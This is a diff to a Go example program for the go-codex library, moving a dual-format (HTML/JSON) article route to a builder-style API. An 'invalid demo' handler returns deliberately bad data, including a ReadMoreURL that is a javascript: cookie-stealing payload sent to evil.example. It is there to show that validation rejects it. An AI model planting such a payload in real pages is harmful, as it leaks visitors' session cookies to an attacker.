@@ -35,6 +35,7 @@ import (
 	"github.com/DaniDeer/go-codex/api/rest"
 	"github.com/DaniDeer/go-codex/codex"
 	"github.com/DaniDeer/go-codex/format"
+	"github.com/DaniDeer/go-codex/middleware"
 	"github.com/DaniDeer/go-codex/stats"
 	"github.com/DaniDeer/go-codex/validate"
 )
@@ -137,10 +138,10 @@ func (o *CountingObserver) Print() {
 
 // ── Main ──────────────────────────────────────────────────────────────────────
 
-// mustRegister exits the program if nethttp.Register returns an error.
-func mustRegister(err error) {
+// mustServe exits the program if Register or Serve returns an error.
+func mustServe(err error, what string) {
 	if err != nil {
-		fmt.Fprintf(os.Stderr, "nethttp.Register failed: %v\n", err)
+		fmt.Fprintf(os.Stderr, "%s failed: %v\n", what, err)
 		os.Exit(1)
 	}
 }
@@ -148,26 +149,21 @@ func mustRegister(err error) {
 func main() {
 	// ── Route definition ─────────────────────────────────────────────────────
 	//
-	// rest.AddRoute registers route metadata and codecs. By configuring both the
-	// templ format and JSON on the returned handle, the same route serves two
-	// representations:
+	// rest.Formats declares both formats inline on the route. The same route
+	// serves two representations:
 	//   Accept: text/html        → articleCard component rendered as HTML
 	//   Accept: application/json → JSON-encoded ArticleProps
 	//
 	// No separate route, no separate handler — one definition, two formats.
 
 	b := rest.NewBuilder(rest.Info{Title: "Article API", Version: "1.0.0"})
-	articleRoute, err := rest.NewRoute[struct{}, ArticleProps]("GET", "/article",
+	articleRoute := rest.NewRoute[struct{}, ArticleProps]("GET", "/article",
 		codex.Empty, ArticlePropsCodec,
 		rest.RouteMeta{OperationID: "getArticle"},
-	).Register(b)
-	if err != nil {
-		fmt.Fprintln(os.Stderr, "route error:", err)
-		os.Exit(1)
-	}
-	articleRoute = articleRoute.WithFormats(
-		adapttempl.Format(ArticlePropsCodec, articleCard), // Accept: text/html
-		format.JSON(ArticlePropsCodec),                    // Accept: application/json
+		rest.Formats(
+			adapttempl.Format(ArticlePropsCodec, articleCard), // Accept: text/html
+			format.JSON(ArticlePropsCodec),                    // Accept: application/json
+		),
 	)
 
 	// ── Handler ──────────────────────────────────────────────────────────────
@@ -192,9 +188,12 @@ func main() {
 		}, nil
 	}
 
-	obsMw := nethttp.ObservabilityMiddleware(obs)
+	obsMw := middleware.ServerImplementation{Name: "observability", Fn: nethttp.Observability(obs)}
+	articleRoute = articleRoute.WithHandler(handler).HandleMW(nil, obsMw.Fn).WithOptions(nethttp.Options{})
+	mustServe(articleRoute.Register(b), "register /article")
+
 	mux := http.NewServeMux()
-	mustRegister(nethttp.Register(mux, articleRoute, handler, nethttp.Options{}, obsMw))
+	mustServe(nethttp.Serve(mux, b), "Serve")
 	srv := httptest.NewServer(mux)
 	defer srv.Close()
 
@@ -223,8 +222,15 @@ func main() {
 	// codec's Refine constraints (symmetric validation) and returns 500 — the
 	// articleCard component is never rendered with invalid data.
 
-	invalidMux := http.NewServeMux()
-	mustRegister(nethttp.Register(invalidMux, articleRoute, func(_ context.Context, _ struct{}) (ArticleProps, error) {
+	invalidB := rest.NewBuilder(rest.Info{Title: "Article API (invalid demo)", Version: "1.0.0"})
+	invalidArticleRoute := rest.NewRoute[struct{}, ArticleProps]("GET", "/article",
+		codex.Empty, ArticlePropsCodec,
+		rest.RouteMeta{OperationID: "getArticle"},
+		rest.Formats(
+			adapttempl.Format(ArticlePropsCodec, articleCard),
+			format.JSON(ArticlePropsCodec),
+		),
+	).WithHandler(func(_ context.Context, _ struct{}) (ArticleProps, error) {
 		return ArticleProps{
 			ID:          "not-a-uuid",   // fails UUID
 			Title:       "",             // fails NonEmptyString
@@ -233,7 +239,11 @@ func main() {
 			Date:        "32/13/9999",                                                        // fails Date
 			ReadMoreURL: "javascript:fetch('https://evil.example/steal?c='+document.cookie)", // fails URL scheme
 		}, nil
-	}, nethttp.Options{}, obsMw))
+	}).HandleMW(nil, obsMw.Fn).WithOptions(nethttp.Options{})
+	mustServe(invalidArticleRoute.Register(invalidB), "register invalid /article")
+
+	invalidMux := http.NewServeMux()
+	mustServe(nethttp.Serve(invalidMux, invalidB), "Serve invalid")
 	invalidSrv := httptest.NewServer(invalidMux)
 	defer invalidSrv.Close()
 
